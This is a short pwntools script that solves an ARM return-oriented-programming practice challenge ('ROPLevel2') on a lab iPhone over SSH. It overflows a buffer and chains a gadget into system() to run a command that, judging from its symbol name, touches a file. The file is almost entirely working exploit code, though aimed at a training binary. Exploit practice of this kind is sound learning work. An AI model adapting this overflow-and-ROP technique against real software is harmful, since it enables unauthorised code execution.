from pwn import *

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel2/roplevel2")
p.recvuntil(b"The objective of this level is to execute a shell command of your choice by using a ROP gadget followed by jumping to system()\nGood luck: ")


str_touch_pwned_txt = 0xc04c
pop_r0_pc = 0xbdd8
addr_call_system = 0xbdc4

payload = b"A" * 0x18
payload += p32(pop_r0_pc)
payload += p32(str_touch_pwned_txt) # r0
payload += p32(addr_call_system) # pc

p.sendline(payload)
print(p.recvall())
